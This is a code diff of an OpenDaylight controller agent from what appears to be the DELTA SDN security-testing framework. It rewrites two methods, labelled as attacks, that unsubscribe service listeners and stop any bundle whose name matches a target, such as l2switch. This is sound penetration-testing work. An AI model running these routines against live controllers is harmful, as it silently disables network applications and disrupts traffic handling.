@@ -8,9 +8,9 @@
 package org.deltaproject.odlagent.core;
 
 import org.apache.felix.dm.Component;
-import org.apache.felix.dm.Dependency;
 import org.apache.felix.dm.DependencyActivatorBase;
 import org.apache.felix.dm.DependencyManager;
+import org.osgi.util.tracker.ServiceTracker;
 import org.opendaylight.controller.md.sal.binding.api.DataBroker;
 import org.opendaylight.controller.sal.binding.api.BindingAwareBroker;
 import org.opendaylight.controller.sal.binding.api.BindingAwareBroker.ConsumerContext;
@@ -21,6 +21,7 @@ import org.osgi.framework.*;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import java.util.Arrays;
 import java.util.Dictionary;
 import java.util.List;
 
@@ -30,34 +31,19 @@ import java.util.List;
  * when MD-SAL is present.
  */
 public class Activator extends DependencyActivatorBase implements AutoCloseable, BindingAwareConsumer {
-
     private static final Logger LOG = LoggerFactory.getLogger(Activator.class);
+
     private AppAgent appAgent;
-    private AMinterface cm;
-    private List<DependencyManager> dlist;
-    private Bundle[] blist;
+    private Interface cm;
 
     /**
      * Invoked first
      */
     @Override
     public void init(BundleContext bundleContext, DependencyManager dependencyManager) throws Exception {
-        LOG.info("[DELTA] init() passing");
-
         ServiceReference<BindingAwareBroker> brokerRef = bundleContext.getServiceReference(BindingAwareBroker.class);
         BindingAwareBroker broker = bundleContext.getService(brokerRef);
         broker.registerConsumer(this);
-
-        dlist = dependencyManager.getDependencyManagers();
-        blist = bundleContext.getBundles();
-
-        LOG.info(dlist.size() + ":" + blist.length);
-
-//        cm = new AMinterface();
-//        cm.setActivator(this);
-//        cm.setServerAddr();
-//        cm.connectServer("ActAgent");
-//        cm.start();
     }
 
     /**
@@ -65,7 +51,6 @@ public class Activator extends DependencyActivatorBase implements AutoCloseable,
      */
     @Override
     public void onSessionInitialized(ConsumerContext session) {
-        LOG.info("[DELTA] inSessionInitialized() passing");
         /**
          * We create instance of our AppAgent
          * and set all required dependencies,
@@ -76,13 +61,14 @@ public class Activator extends DependencyActivatorBase implements AutoCloseable,
          *   NotificationService - for receiving notifications such as packet in.
          *
          */
+
         appAgent = new AppAgentImpl();
         appAgent.setDataBroker(session.getSALService(DataBroker.class));
         appAgent.setPacketProcessingService(session.getRpcService(PacketProcessingService.class));
         appAgent.setNotificationService(session.getSALService(NotificationService.class));
         appAgent.start();
 
-//        testEventListenerUnsubscription("l2switch");
+        // connectManager();
     }
 
     @Override
@@ -95,75 +81,83 @@ public class Activator extends DependencyActivatorBase implements AutoCloseable,
 
     @Override
     public void destroy(BundleContext bundleContext, DependencyManager dependencyManager) throws Exception {
-        LOG.info("[DELTA] destroy() passing");
+
     }
 
-    /* 3.1.100: Application Eviction */
-    public String testApplicationEviction(String target) {
-        boolean removed = false;
+    public void connectManager() {
+        cm = new Interface();
+        cm.setActivator(this);
+        cm.setServerAddr();
+        cm.connectServer("ActAgent");
+        cm.start();
+    }
 
-        for (Bundle b : blist) {
-            if (b.getSymbolicName().contains("l2switch")) {
-                LOG.info("[DELTA] uninstall! - " + b.getSymbolicName());
-                try {
-                    b.uninstall();
-                    removed = true;
-                } catch (BundleException e) {
-                    e.printStackTrace();
-                }
-            }
+    /*
+     * 3.1.090: Event Listener Unsubscription
+     */
+    public String testEventListenerUnsubscription(String target) {
+        LOG.info("[DELTA] Event Listener Unsubscription attack");
+
+        Bundle[] blist = getBundleContext().getBundles();
+        boolean isUnreg = false;
+
+        if (blist == null) {
+            LOG.info("[DELTA] bundle list is NULL");
+            return "null";
         }
 
-        if (removed)
-            return "l2switch";
-        else
-            return "null";
-    }
+        for (Bundle b : blist) {
+            ServiceReference<?>[] serviceReferences = b.getServicesInUse();
 
-    /* 3.1.090: Event Listener Unsubscription */
-    public String testEventListenerUnsubscription(String input) {
-        String removed = "";
-
-        for (int i = 0; i < dlist.size(); i++) {
-            DependencyManager dm = dlist.get(i);
-            List<Component> temp = dm.getComponents();
-
-            for (int j = 0; j < temp.size(); j++) {
-                Component ct = temp.get(j);
-
-                @SuppressWarnings("unchecked")
-                Dictionary<String, Object> props = ct.getServiceProperties();
-                if (props != null) {
-                    Object res = props.get("salListenerName"); // salListenerName
-                    if (res != null) {
-                        if (!((String) res).contains(input)) {
-                            continue;
+            if (serviceReferences != null) {
+                for (ServiceReference sr : serviceReferences) {
+                    if (sr.toString().contains(target)) {
+                        LOG.info("[DELTA] unget service " + b.getSymbolicName() + ":" + sr.toString());
+                        if (b.getBundleContext().ungetService(sr)) {
+                            isUnreg = true;
                         }
-
-                        ServiceRegistration sr = ct.getServiceRegistration();
-                        Bundle bd = sr.getReference().getBundle();
-                        LOG.info("[TEST] " + bd.getSymbolicName());
-
-						/* service unregister */
-                        sr.unregister();
-                        removed = sr.toString();
-
-                        String[] lists = sr.getReference().getPropertyKeys();
-                        for (String s : lists) {
-                            LOG.info(s + " ");
-                        }
-
-//                        List<Dependency> dpl = ct.getDependencies();
-//                        for (int k = 0; k < dpl.size(); k++) {
-//                            Dependency dp = dpl.get(k);
-//                            ct.remove(dp);
-//                        }
-
-                        return removed;
                     }
                 }
             }
         }
-        return removed;
+
+        if (isUnreg)
+            return target;
+        else
+            return "null";
+    }
+
+    /*
+     * 3.1.100: Application Eviction
+     */
+    public String testApplicationEviction(String target) {
+        LOG.info("[DELTA] Application Eviction attack");
+
+        Bundle[] blist = getBundleContext().getBundles();
+        boolean isStopped = false;
+
+        if (blist == null) {
+            LOG.info("DELTA blist is NULL");
+            return "null";
+        }
+
+        for (Bundle b : blist) {
+            if (b.getSymbolicName().contains(target)) {
+                LOG.info("[DELTA] stop - " + b.getSymbolicName());
+
+                try {
+                    b.stop();
+                    isStopped = true;
+                } catch (BundleException e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+
+        if (isStopped)
+            return target;
+        else
+            return "null";
     }
 }
